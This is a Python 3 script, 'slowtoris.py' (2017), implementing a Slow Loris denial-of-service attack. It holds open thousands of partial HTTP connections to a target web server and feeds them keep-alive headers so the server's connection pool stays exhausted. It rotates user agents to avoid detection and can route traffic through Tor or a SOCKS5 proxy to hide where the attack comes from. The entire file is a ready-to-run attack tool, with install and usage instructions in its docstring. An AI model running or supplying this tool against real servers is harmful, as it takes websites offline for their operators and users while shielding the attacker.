#!/usr/bin/env python3

'''

slowtoris.py - Slow Loris implementation in Python3 with support for Tor and SOCKS5 proxies.

--

Gabriel Duque - 2017

'''

import click
import socket
import logging
import time
from random import randint, choice

# Initializes a connection with specified options
def init_connection(target, port, randomize, user_agents):
    # Create the new socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    # Connect to target
    sock.connect((target, port))
    # Send request
    sock.send("GET /?{} HTTP/1.1\r\n".format(randint(0, 2000)).encode("utf-8"))
    # Randomize user agent if desired and send user agents package
    if randomize:
        sock.send("User-Agent: {}\r\n".format(choice(user_agents)).encode("utf-8"))
    else:
        sock.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    # Send requested language package
    sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    # Return the conected socket
    return sock

# Use click to handle arguments and switches

@click.command()
@click.option('--port', '-p', default=80, help="Port to attack on the remote target. Default is 80.")
@click.option('--sockets', '-s', default=10000, help="Number of sockets to open with the remote target.")
@click.option('--randomize', '-r', is_flag=True, help="Randomize user agents for every new socket.")
@click.option('--tor', '-T', is_flag=True, help="Open the connections the connections through the Tor network by using localhost:9050 as a SOCKS5 proxy. If you wish to use the Tor network through another host or port you must use the -x option.")
@click.option('--proxy', '-x', help="Usage: -x proxy-host:proxy-port .Use a SOCKS5 proxy to communicate with the target.")
@click.option('--quiet', '-q', is_flag=True, help="Run the script in quiet mode removing all output.")
@click.argument('target', required=1)
def attack(target, port, sockets, randomize, tor, proxy, quiet):
    """A Slow Loris attack implementation in Python3 with support for the Tor network and SOCKS5 proxies.\n
    You must have the click Python3 module which can be installed with pip:\n
        $ sudo pip3 install click\n
    You must have the socks Python3 module which can be installed through various packages by using pip, we suggest PySocks:\n
        $ sudo pip3 install PySocks\n
    You can view the usage of this script by running:\n 
        $ ./slowtoris.py --help\n
    If you wish to use the Tor network, tor must be installed and the service must be started.\n
    Installation:\n
        Ubuntu/Debian:  https://www.torproject.org/docs/debian.html.en\n
        Arch Linux:     # pacman -S tor\n
        Gentoo Linux:   # emerge --ask --verbose net-vpn/tor\n
        CentOS/Fedora:  # yum install tor\n
    Starting the tor service:\n
        If you do not know if you are using Systemd or OpenRC you are very probably using Systemd.\n
        Systemd: # systemctl start tor\n
        OpenRC:  # rc-service tor start"""

    # Set the verbose level and format to view status of the attack
    if not quiet:
        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
    else:
        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)

    # Import socks module for proxy usage and parse proxy argument
    if tor:
        try:
            import socks
            socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
            socket.socket = socks.socksocket
            logging.info("Tor enabled on localhost:9050")
        except ImportError:
            logging.error("Socks proxy library not found...")

    # Import socks module for proxy usage and parse proxy argument
    elif proxy:
        try:
            import socks
            proxy_host = proxy.split(":")[0]
            proxy_port = proxy.split(":")[1]
            socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
            socket.socket = socks.socksocket
            logging.info("SOCKS5 proxy enabled on "+proxy_host+":"+proxy_port)
        except ImportError:
            logging.error("Socks proxy library not found...")

    socket_list = []

    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]


    # Inform user the script has started
    logging.info("Target: %s \tSockets: %s", target, sockets)

    logging.info("Creating sockets...")

    # Start connecting with the target
    for i in range(sockets):
        try:
            logging.debug("Creating socket number %s", i)
            sock = init_connection(target, port, randomize, user_agents)
        except socket.error:
            break
        socket_list.append(sock)

    # Send the keep-alive messages so the target doesn't close the connections
    while True:
        logging.info("Keeping connections alive... Socket count: %s", len(socket_list))
        for sock in list(socket_list):
            try:
                sock.send("X-a: {}\r\n".format(randint(1, 5000)).encode("utf-8"))
            except socket.error:
                # Remove socket from list if dead connection
                socket_list.remove(sock)

        # Recreate dead sockets
        logging.debug("Recreating dead sockets...")
        for i in range(sockets - len(socket_list)):
            try:
                sock = init_connection(target, port, randomize, user_agents)
                if sock:
                    socket_list.append(sock)
            except socket.error:
                break


if __name__ == '__main__':
    attack()